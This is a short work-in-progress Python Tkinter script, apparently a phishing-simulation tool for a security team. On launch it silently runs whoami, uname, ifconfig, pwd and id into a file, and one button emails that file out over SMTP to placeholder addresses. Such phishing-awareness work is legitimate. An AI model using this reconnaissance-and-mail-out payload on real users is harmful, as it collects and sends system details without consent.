####WIP####

#!/usr/bin/python

from Tkinter import *
from  tkMessageBox import *
import smtplib
import platform
import sys
import os
from email.mime.text import MIMEText

os.system('(whoami; uname -ar; ifconfig; pwd; id;) > me')

def answer():
    showerror("Peekab000:", "We see you!, You are now on the Security Teams radar and maybe shouldn't have broken policy")

def callback():
    if askyesno('Huh Oh!:', 'You have now been seen by the Security Team! Would you like to close me?'):
        showwarning('Yes', 'NO! Go speak with the Security Team!')
    else:
        showinfo('No', "Smart answer, cause I wasn't going to close till you spoke to the Security Team anyways.")

	
def uname():
	print platform.uname()	
	
def givemeinfo():
	os.system('(whoami; uname -ar; ifconfig; pwd; id; ) > me.txt')

def maail():
 fp = open('me', 'rb')
 msg = MIMEText(fp.read())
 fp.close()

 msg['Subject'] = 'You Caught a Phish!'
 msg['From'] = '<FROM-GOES-HERE>'
 msg['To'] = '<TO-GOES-HERE>'
 msg['cc'] = '<CC-GOES-HERE>'

 s = smtplib.SMTP('<SMTP-GOES-HERE>')
 s.sendmail('<FROM-GOES-HERE>', ['<TO-GOES-HERE>','<CC-GOES-HERE>'], msg.as_string())
 s.quit() 

Button(text='WHAT!?', command=answer).pack(fill=X)
Button(text='Give Me Options', command=callback).pack(fill=X)
Button(text='Informative', command=uname).pack(fill=X)
Button(text='I personally would not click this!', command=givemeinfo).pack(fill=X)
Button(text='You are not in trouble: Click me to email Security now', command=maail).pack(fill=X)
mainloop()




